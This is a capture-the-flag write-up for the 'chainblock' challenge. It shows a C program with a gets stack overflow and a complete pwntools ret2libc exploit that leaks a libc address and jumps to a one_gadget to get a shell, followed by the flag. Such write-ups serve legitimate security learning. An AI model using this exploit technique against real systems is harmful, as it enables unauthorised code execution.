```text
I made a chain of blocks!
nc pwn.be.ax 5000
```

We're provided source, a binary, and ld/libc. 

### chainblock.c

```c
#include <stdio.h>
char* name = "Techlead";
int balance = 100000000;
void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);
	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}
	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}
int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");
	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");
	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");
	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");
	printf("For security reasons we require that you verify your identity.\n");
	verify();
}
```
The vulnerability is in the function verify, in the gets invocation. There isn't any useful code for shell or flag reading inside the binary, but we can override the return pointer and it's linked to libc so ret2libc is an option. I did a two step exploit which leaked a pointer into libc and returned back into the vulnerable function, and then using the calculated libc address to return onto a one_gadget. 
```python
#!/usr/bin/env python3
from pwn import *
exe = ELF("chainblock")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
POP_RDI_RET = p64(0x401493)
context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("pwn.be.ax", 5000)
    elif args.GDB:
        return gdb.debug([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
def main():
    r = conn()
    payload = flat({
        264: POP_RDI_RET,
        272: p64(exe.symbols['__libc_start_main']),
        280: p64(exe.plt['puts']),
        288: p64(exe.symbols['verify']),
    })
    r.sendline(payload)
    r.recvuntil(b"identity!\n")
    libc_start_address = int.from_bytes(r.recvline().rstrip(), byteorder="little")
    libc.address = libc_start_address - libc.sym["__libc_start_main"]
    log.info("Address of libc %s " % hex(libc.address))
    payload = flat({
        264: p64(libc.address + 0xde78f) # one_gadget
    })
    r.sendline(payload)
    # good luck pwning :)
    r.interactive()
if __name__ == "__main__":
    main()
```
The flag is corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
